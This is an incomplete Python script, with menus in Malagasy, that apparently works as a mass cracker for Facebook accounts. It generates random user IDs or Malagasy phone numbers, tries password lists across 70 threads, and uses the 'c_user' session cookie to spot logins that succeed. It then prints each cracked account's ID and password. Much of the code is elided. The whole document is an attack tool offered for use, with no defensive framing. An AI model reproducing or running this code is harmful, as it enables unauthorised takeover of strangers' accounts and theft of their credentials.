...
══════════════════════════════════════════════════
  Author       : Ronny Tricker Gasy
  Famille      :   ..Leader...
  Milina         : Maimaim-poana
  Youtubako      : Pro
══════════════════════════════════════════════════"""
loop = 0
oks = []
...
except:print('\n\033[1;31mTsy mandeha kaonektiona anao ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
...
def asad():
    ...
    if opt =='1':
        ...
        print('\n\033[1;31mSafidio ny Safidinao\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('[1] Maka compte gasy')
    print('[2] Maka numero gasy')
    print('[B] Miverina')
    print(50*'-')
    opt = input('Safidinao tompoko >>> ')
    if opt =='1':
        random_uid()
    elif opt =='2':
        random_number()
...
def random_uid():
    ...
    os.system('clear')
    print(logo)
    limit = int(input('Firy kaonty Tianao alaina (+1000) ? '))
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        tl = str(len(user))
        print('Total ids: '+tl)
        print('Manomboka Ny Fakana kaonty')
        print(50*'-')
        for uid in user:
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Vita Fakana Kaonty Teo')
...
def random_number():
    ...
    os.system('clear')
    print(logo)
    print('\033[1;33mKaody Gasy: 26134 .\033[0;97m')
    kode = input('Put code: ')
    limit = int(input('Firy compte Tianao alaina (+1000)? '))
    for nmbr in range(limit):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[Ronny-XD] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[Ronny- Sorry] '+cid+' | '+ps+'\033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r[%s/%s]  XD:- %s  Sorry:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
